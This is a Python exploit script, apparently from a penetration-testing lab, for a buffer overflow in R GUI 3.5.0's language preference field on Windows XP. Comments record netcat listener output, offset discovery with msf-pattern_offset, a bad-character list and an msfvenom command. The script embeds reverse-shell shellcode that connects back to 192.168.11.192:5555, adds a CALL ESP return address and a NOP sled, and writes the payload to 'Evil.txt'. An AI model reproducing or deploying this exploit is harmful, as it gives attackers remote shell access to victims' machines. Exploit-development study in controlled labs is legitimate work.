#!/usr/bin/python
#EDIT > RGUI PREFERENCE > COPY INTO LANGUAFE FOR MENUS AND MESSAGE TEXT BOX TO CRASH
#root@kali:~/Desktop# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.192] from (UNKNOWN) [192.168.11.177] 1174
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Program Files\R\R-3.5.0\bin\i386>
#


#root@kali:~/Desktop# /usr/bin/msf-pattern_offset -q 6A41376A
#[*] Exact match at offset 292
#root@kali:~/Desktop# /usr/bin/msf-pattern_offset -q 42366442
#[*] Exact match at offset 888



#\x0a\x0d
badchar=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e"
"\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d"
"\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
"\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b"
"\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a"
"\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69"
"\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
"\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87"
"\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96"
"\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5"
"\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
"\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2"
"\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1"
"\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


#root@kali:~/Desktop# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.192 lport=5555 -e x86/alpha_mixed -f python BufferRegister=ESP
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 702 (iteration=0)
#x86/alpha_mixed chosen with final size 702
#Payload size: 702 bytes
#Final size of python file: 3358 bytes
buf =  ""
buf += "\xdb\xc3\xbf\x51\xce\x87\xbb\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x52\x31\x7a\x17\x03\x7a\x17\x83\x93\xca\x65"
buf += "\x4e\xef\x3b\xeb\xb1\x0f\xbc\x8c\x38\xea\x8d\x8c\x5f"
buf += "\x7f\xbd\x3c\x2b\x2d\x32\xb6\x79\xc5\xc1\xba\x55\xea"
buf += "\x62\x70\x80\xc5\x73\x29\xf0\x44\xf0\x30\x25\xa6\xc9"
buf += "\xfa\x38\xa7\x0e\xe6\xb1\xf5\xc7\x6c\x67\xe9\x6c\x38"
buf += "\xb4\x82\x3f\xac\xbc\x77\xf7\xcf\xed\x26\x83\x89\x2d"
buf += "\xc9\x40\xa2\x67\xd1\x85\x8f\x3e\x6a\x7d\x7b\xc1\xba"
buf += "\x4f\x84\x6e\x83\x7f\x77\x6e\xc4\xb8\x68\x05\x3c\xbb"
buf += "\x15\x1e\xfb\xc1\xc1\xab\x1f\x61\x81\x0c\xfb\x93\x46"
buf += "\xca\x88\x98\x23\x98\xd6\xbc\xb2\x4d\x6d\xb8\x3f\x70"
buf += "\xa1\x48\x7b\x57\x65\x10\xdf\xf6\x3c\xfc\x8e\x07\x5e"
buf += "\x5f\x6e\xa2\x15\x72\x7b\xdf\x74\x1b\x48\xd2\x86\xdb"
buf += "\xc6\x65\xf5\xe9\x49\xde\x91\x41\x01\xf8\x66\xa5\x38"
buf += "\xbc\xf8\x58\xc3\xbd\xd1\x9e\x97\xed\x49\x36\x98\x65"
buf += "\x89\xb7\x4d\x29\xd9\x17\x3e\x8a\x89\xd7\xee\x62\xc3"
buf += "\xd7\xd1\x93\xec\x3d\x7a\x39\x17\xd6\x45\x16\x1c\xe6"
buf += "\x2e\x65\x22\xf3\x1d\xe0\xc4\x91\x71\xa5\x5f\x0e\xeb"
buf += "\xec\x2b\xaf\xf4\x3a\x56\xef\x7f\xc9\xa7\xbe\x77\xa4"
buf += "\xbb\x57\x78\xf3\xe1\xfe\x87\x29\x8d\x9d\x1a\xb6\x4d"
buf += "\xeb\x06\x61\x1a\xbc\xf9\x78\xce\x50\xa3\xd2\xec\xa8"
buf += "\x35\x1c\xb4\x76\x86\xa3\x35\xfa\xb2\x87\x25\xc2\x3b"
buf += "\x8c\x11\x9a\x6d\x5a\xcf\x5c\xc4\x2c\xb9\x36\xbb\xe6"
buf += "\x2d\xce\xf7\x38\x2b\xcf\xdd\xce\xd3\x7e\x88\x96\xec"
buf += "\x4f\x5c\x1f\x95\xad\xfc\xe0\x4c\x76\x0c\xab\xcc\xdf"
buf += "\x85\x72\x85\x5d\xc8\x84\x70\xa1\xf5\x06\x70\x5a\x02"
buf += "\x16\xf1\x5f\x4e\x90\xea\x2d\xdf\x75\x0c\x81\xe0\x5f"


#6CB9BC4A   FFD4             CALL ESP


buffer = "A" * 292 + "\x4A\xBC\xB9\x6C" + "\x90"* 16 + buf +"D" * 6000
try:
	f=open("Evil.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e

